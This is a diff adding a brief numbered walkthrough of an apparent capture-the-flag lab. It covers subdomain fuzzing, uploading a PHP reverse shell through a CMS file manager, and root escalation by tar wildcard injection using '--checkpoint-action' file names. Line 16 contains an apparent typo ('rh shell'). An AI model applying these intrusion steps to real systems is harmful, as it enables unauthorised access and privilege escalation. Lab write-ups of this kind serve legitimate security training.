@@ -1,0 +1,19 @@
+1 - echo "10.10.171.232 cmess.thm" | tee -a /etc/hosts
+2 - http://10.10.171.232/robots.txt
+3 - ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://cmess.thm -H "Host: FUZZ.cmess.thm" -mc 200
+4 - echo "10.10.171.232 dev.cmess.thm" | tee -a /etc/hosts
+5 - http://dev.cmess.thm (andre and password found)
+6 - http://cmess.thm -> Content -> File Manager
+7 - cp /usr/share/webshells/php/php-reverse-shell.php .
+8 - upload assets/php-reverse-shell.php
+9 - http://cmess.thm/assets/php-reverse-shell.php
+10 - cat /opt/.password.bak
+11 - su andre
+12 - cat /home/andre/user.txt
+13 - sudo -l (TAR wildcard injection)
+14 - cat > /home/andre/backup/shell << EOF
+Bash reverse shell
+
+15 - echo "" > "/home/andre/backup/--checkpoint=1"
+16 - echo "" > "/home/andre/backup/--checkpoint-action=exec=rh shell"
+17 - cat /root/root.txt
